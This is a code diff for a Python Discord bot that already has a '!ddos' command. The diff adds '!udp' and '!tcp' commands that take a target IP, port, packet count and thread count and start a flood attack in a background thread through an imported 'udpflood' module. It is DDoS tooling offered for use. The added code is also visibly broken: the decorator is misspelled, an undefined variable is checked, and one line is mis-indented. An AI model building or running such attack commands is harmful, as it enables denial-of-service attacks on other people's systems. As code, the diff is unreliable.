@@ -6,6 +6,7 @@ import threading
 import subprocess
 import os
 from keep_alive import keep_alive
+import udpflood
 import time
 
 bot = commands.Bot(command_prefix='!')
@@ -35,6 +36,49 @@ async def ddos(ctx,arg,port):
 async def stop(ctx):
     await ctx.send("stopped the attack.")
     hammer.flag = False
+
+@bot.commnad()
+async def udp(ctx,ip,port,connection,thread):
+    if not ip:
+        await ctx.send("no ip!")
+    if not port:            
+        await ctx.send("no port!")
+    if not connect:
+        await ctx.send("choose ackets per one connection!")
+    if not thread:
+    await ctx.send("no thread!")
+
+    udpflood.ip = ip
+    udpflood.port = port
+    udpflood.times = connection
+    udpflood.thread = thread
+    udpflood.choice ="y"
+
+
+    th = threading.Thread(target=udpflood.mainudp)
+    th.start()
+
+
+@bot.commnad()
+async def tcp(ctx,ip,port,connection,thread):
+    if not ip:
+        await ctx.send("no ip!")
+    if not port:            
+        await ctx.send("no port!")
+    if not connect:
+        await ctx.send("choose ackets per one connection!")
+    if not thread:
+    await ctx.send("no thread!")
+
+    udpflood.ip = ip
+    udpflood.port = port
+    udpflood.times = connection
+    udpflood.thread = thread
+    udpflood.choice ="n"
+
+
+    th = threading.Thread(target=udpflood.mainudp)
+    th.start()
 
 keep_alive()
 token = os.getenv("token")
